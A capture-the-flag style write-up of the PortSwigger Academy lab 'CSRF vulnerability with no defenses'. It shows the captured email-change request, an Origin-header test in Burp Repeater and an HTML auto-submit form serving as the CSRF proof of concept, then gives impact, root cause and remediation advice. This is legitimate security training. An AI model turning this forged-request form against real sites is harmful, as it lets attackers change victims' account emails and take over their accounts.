# CSRF Vulnerability with No Defenses

**Platform:** PortSwigger Web Security Academy
**Difficulty:** Apprentice
**Vulnerability:** Cross-Site Request Forgery (CSRF)
**Tools:** Burp Suite, Burp Repeater, HTML
**Status:** ✅ Solved
**Challenge:** 30 Days of Web Security — Day 01

## 1. Objective

The objective of this lab was to identify and exploit a Cross-Site Request Forgery (CSRF) vulnerability in the account email change functionality.

The goal was to demonstrate that an authenticated user's browser could be induced to perform an unintended account modification.

## 2. Vulnerability Description

CSRF occurs when a web application accepts a state-changing request without adequately verifying that it was intentionally initiated by the authenticated user.

An attacker may exploit this behavior by creating a malicious web page that causes the victim's browser to submit a request to the vulnerable application.

## 3. HTTP Request Analysis

After logging into the lab application, I changed the account email address and captured the request using Burp Suite.

```http
POST /my-account/change-email HTTP/2
Host: <LAB-HOST>
Cookie: session=<REDACTED>
Content-Type: application/x-www-form-urlencoded

email=test%40example.net
```

### Observations

* The email change functionality uses the `POST` method.
* Authentication relies on a session cookie.
* The request body contains the `email` parameter.
* No anti-CSRF token was present in the captured request.

The absence of a CSRF token was a potential warning sign, but further testing was required to confirm the vulnerability.

## 4. Testing Origin Validation

I sent the captured request to Burp Repeater and modified the following headers:

```http
Origin: https://example.org
Referer: https://example.org/
```

The application returned:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
```

I verified that the account email address had changed successfully.

This demonstrated that the application accepted the tested request despite the modified origin information.

## 5. Proof of Concept

I created an HTML form using the PortSwigger Exploit Server.

```html
<!DOCTYPE html>
<html>
<body>
    <form action="https://<LAB-HOST>/my-account/change-email"
          method="POST">
        <input type="hidden"
               name="email"
               value="csrf-proof@example.net">
        <button type="submit">Submit</button>
    </form>
</body>
</html>
```

The HTML form submits an email change request to the vulnerable endpoint.

### Verification

1. I opened the exploit page in an authenticated test browser.
2. I submitted the HTML form.
3. I returned to the account page.
4. I confirmed that the email address had changed.

The cross-site request successfully modified the authenticated user's account.

I then used the lab's **Deliver to victim** functionality with an automatically submitted version of the form.

**Result: The laboratory was successfully solved.**

## 6. Security Impact

An attacker could potentially induce an authenticated user to change their account email address without intending to do so.

Depending on the application's email verification and account recovery mechanisms, this could contribute to account compromise or loss of account access.

## 7. Root Cause

The application did not adequately verify that the email change request was intentionally initiated by the authenticated user.

A valid session cookie was sufficient for the tested state-changing operation.

## 8. Remediation

Recommended security controls include:

* Implementing unpredictable anti-CSRF tokens that are validated on the server.
* Validating the `Origin` header for sensitive requests.
* Using an appropriate `SameSite` cookie policy as defense in depth.
* Requiring additional verification for sensitive account changes.

A secure implementation should not rely solely on the presence of a valid session cookie.

## 9. Evidence

Screenshots will be added to document:

* The captured HTTP request in Burp Suite.
* The HTML CSRF proof of concept.
* The successful PortSwigger lab completion.

All session identifiers and other sensitive values must be redacted.

## 10. Key Takeaways

This laboratory helped me understand the difference between authentication and protection against unintended requests.

I gained practical experience with:

* HTTP request analysis.
* Burp Suite and Burp Repeater.
* Testing origin validation.
* Creating HTML-based CSRF proofs of concept.
* Understanding the security impact of missing CSRF protections.

---

**Environment:** PortSwigger Web Security Academy
**Testing scope:** Authorized educational laboratory only.
